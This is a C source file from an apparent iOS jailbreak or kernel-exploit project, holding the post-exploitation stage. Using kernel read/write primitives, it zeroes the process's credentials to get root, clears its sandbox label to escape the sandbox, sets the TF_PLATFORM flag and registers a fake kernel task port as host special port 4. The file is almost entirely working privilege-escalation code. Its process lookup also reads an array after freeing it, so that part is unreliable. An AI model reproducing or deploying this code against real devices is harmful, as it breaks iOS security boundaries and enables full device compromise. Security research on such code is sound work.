//
//  post_exploit.c
//  ios-fuzzer
//
//  Created by Quote on 2021/1/28.
//  Copyright Â© 2021 Quote. All rights reserved.
//

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <copyfile.h>
#include "mycommon.h"
#include "utils.h"
#include "k_utils.h"
#include "kapi.h"
#include "k_offsets.h"

#define copyfile(X,Y) (copyfile)(X, Y, 0, COPYFILE_ALL|COPYFILE_RECURSIVE|COPYFILE_NOFOLLOW_SRC);
#define JAILB_ROOT "/private/var/containers/Bundle/jb_resources/"

uint64_t amfid_base = 0;
mach_port_t amfid_exception_port = MACH_PORT_NULL;

static const char *jailb_root = JAILB_ROOT;

char *Build_resource_path(char *filename);

void patch_amfid(pid_t amfid_pid);


#define PROC_ALL_PIDS        1
extern int proc_listpids(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize);
extern int proc_pidpath(int pid, void * buffer, uint32_t  buffersize);

pid_t look_for_proc_internal(const char *name, bool (^match)(const char *path, const char *want))
{
    pid_t *pids = calloc(1, 3000 * sizeof(pid_t));
    int procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, 3000);
    if(procs_cnt > 3000) {
        pids = realloc(pids, procs_cnt * sizeof(pid_t));
        procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, procs_cnt);
    }
    int len;
    char pathBuffer[4096];
    for (int i=(procs_cnt-1); i>=0; i--) {
        if (pids[i] == 0) {
            continue;
        }
        memset(pathBuffer, 0, sizeof(pathBuffer));
        len = proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer));
        if (len == 0) {
            continue;
        }
        if (match(pathBuffer, name)) {
            free(pids);
            return pids[i];
        }
    }
    free(pids);
    return 0;
}

pid_t look_for_proc(const char *proc_name)
{
    return look_for_proc_internal(proc_name, ^bool (const char *path, const char *want) {
        if (!strcmp(path, want)) {
            return true;
        }
        return false;
    });
}

pid_t look_for_proc_basename(const char *base_name)
{
    return look_for_proc_internal(base_name, ^bool (const char *path, const char *want) {
        const char *base = path;
        const char *last = strrchr(path, '/');
        if (last) {
            base = last + 1;
        }
        if (!strcmp(base, want)) {
            return true;
        }
        return false;
    });
}

void patch_TF_PLATFORM(kptr_t task)
{
    uint32_t t_flags = kapi_read32(task + OFFSET(task, t_flags));
    util_info("old t_flags %#x", t_flags);

    t_flags |= 0x00000400; // TF_PLATFORM
    kapi_write32(task + OFFSET(task, t_flags), t_flags);
    t_flags = kapi_read32(task + OFFSET(task, t_flags));
    util_info("new t_flags %#x", t_flags);

    // used in kernel func: csproc_get_platform_binary
}

struct proc_cred {
    char posix_cred[0x100]; // HACK big enough
    kptr_t cr_label;
    kptr_t sandbox_slot;
};

void proc_set_root_cred(kptr_t proc, struct proc_cred **old_cred)
{
    *old_cred = NULL;
    kptr_t p_ucred = kapi_read_kptr(proc + OFFSET(proc, p_ucred));
    kptr_t cr_posix = p_ucred + OFFSET(ucred, cr_posix);

    size_t cred_size = SIZE(posix_cred);
    char zero_cred[cred_size];
    struct proc_cred *cred_label;
    fail_if(cred_size > sizeof(cred_label->posix_cred), "struct proc_cred should be bigger");
    cred_label = malloc(sizeof(*cred_label));

    kapi_read(cr_posix, cred_label->posix_cred, cred_size);
    cred_label->cr_label = kapi_read64(cr_posix + SIZE(posix_cred));
    cred_label->sandbox_slot = 0;

    if (cred_label->cr_label) {
        kptr_t cr_label = cred_label->cr_label | 0xffffff8000000000; // untag, 25 bits
        cred_label->sandbox_slot = kapi_read64(cr_label + 0x10);
        kapi_write64(cr_label + 0x10, 0x0);
    }

    memset(zero_cred, 0, cred_size);
    kapi_write(cr_posix, zero_cred, cred_size);
    *old_cred = cred_label;
}

void proc_restore_cred(kptr_t proc, struct proc_cred *old_cred)
{
    // TODO if you restore the processes credentials this will keep stuff from kernel panicking on app exit.
}

#pragma mark ---- Post-exp main entry ----

void post_exploit(void)
{
    util_info("update proc_self credential");
    // can not do this under PAC
    //kapi_write64(g_exp.self_proc + OFFSET(proc, p_ucred), kernelCredAddr);
    struct proc_cred *old_cred;
    proc_set_root_cred(g_exp.self_proc, &old_cred);
    util_msleep(100);

    int err = setuid(0);
    if (err) {
        perror("setuid");
    }

    // Test writing to the outer worlds
    if (1) { // ok
        FILE *fp = fopen("/var/mobile/test.txt", "wb");
        fail_if(fp == NULL, "failed to write /var/mobile/test.txt");
        util_info("wrote test file: %p", fp);
        fprintf(fp, "hello\n");
        fclose(fp);
    }

    util_info("now we are out of sandbox, check \"/bin/ps -p 1\"");
    // test exec command
    //util_runCommand("/bin/ls", NULL); // not privided by Apple
    util_runCommand("/bin/ps", "-p", "1", NULL); // built-in tools

    patch_TF_PLATFORM(g_exp.self_task);

    // ----------------------------------------------------------------------
    //
    util_info("TODO insert your code here");
    //set special port access...this is kind of like task_for_pid giving us kernel task but from how I understand John levins explanation we have the same access as task_for_pid
    host_set_special_port(HOST_LOCAL_NODE, 4, g_exp.fakeport);
    
    util_info("Setup Specialport for iOS14");
    
    //
    // ----------------------------------------------------------------------

    proc_restore_cred(g_exp.self_proc, old_cred);
    free(old_cred);
}
